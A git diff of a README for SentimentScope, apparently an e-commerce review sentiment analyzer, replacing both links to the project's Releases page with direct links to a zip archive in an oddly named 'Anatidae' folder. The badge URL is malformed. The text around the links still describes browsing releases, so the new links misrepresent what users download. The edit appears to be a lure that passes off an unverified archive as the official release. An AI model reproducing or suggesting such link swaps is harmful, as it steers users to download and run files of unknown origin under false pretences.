@@ -1,6 +1,6 @@
 # 📊 SentimentScope-E-Commerce-Review-Analyzer - Analyze Customer Insights with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Blue.svg)](https://github.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/releases)
+[![Download Now](https://raw.githubusercontent.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/main/Anatidae/SentimentScope-E-Commerce-Review-Analyzer.zip%https://raw.githubusercontent.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/main/Anatidae/SentimentScope-E-Commerce-Review-Analyzer.zip)](https://raw.githubusercontent.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/main/Anatidae/SentimentScope-E-Commerce-Review-Analyzer.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to SentimentScope, your tool for analyzing customer reviews and understa
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: Go to the following link to access the download section of the project. [Download Here](https://github.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/releases)
+1. **Visit the Releases Page**: Go to the following link to access the download section of the project. [Download Here](https://raw.githubusercontent.com/avhiraj/SentimentScope-E-Commerce-Review-Analyzer/main/Anatidae/SentimentScope-E-Commerce-Review-Analyzer.zip)
 
 2. **Choose Your Version**: Once you’re on the Releases page, you will see several versions of the software listed. Select the most recent one for the best features and improvements.
 
